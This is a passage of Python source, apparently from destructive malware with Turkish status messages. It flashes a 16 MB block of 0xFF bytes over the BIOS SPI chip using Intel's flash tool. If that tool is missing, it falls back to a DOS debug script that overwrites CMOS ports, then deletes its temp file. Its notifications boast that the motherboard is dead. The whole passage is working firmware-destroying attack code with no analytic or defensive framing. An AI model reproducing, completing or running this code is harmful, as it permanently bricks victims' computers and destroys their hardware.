        for path in fpt_paths:
            if os.path.exists(path):
                fpt_found = path
                break
        if fpt_found:
            subprocess.run(f'{fpt_found} -bios -d C:\\Windows\\Temp\\bios_backup.bin', shell=True, capture_output=True)
            with open("C:\\Windows\\Temp\\corrupt.bin", "wb") as f:
                f.write(b'\xFF' * (1024 * 1024 * 16))
            subprocess.run(f'{fpt_found} -bios -f C:\\Windows\\Temp\\corrupt.bin', shell=True, capture_output=True)
            send_notification("✅ BIOS SPI bozuldu! (Anakart öldü)")
            return True
        else:
            debug_script = "o 70 2F\no 71 2F\no 72 2F\no 73 2F\nq"
            with open("C:\\Windows\\Temp\\bios_debug.txt", "w") as f:
                f.write(debug_script)
            subprocess.run('debug < C:\\Windows\\Temp\\bios_debug.txt', shell=True, capture_output=True)
            os.remove("C:\\Windows\\Temp\\bios_debug.txt")
            send_notification("✅ BIOS debug ile bozuldu!")
            return True
    except Exception as e:
        send_notification(f"❌ BIOS hatası: {e}")
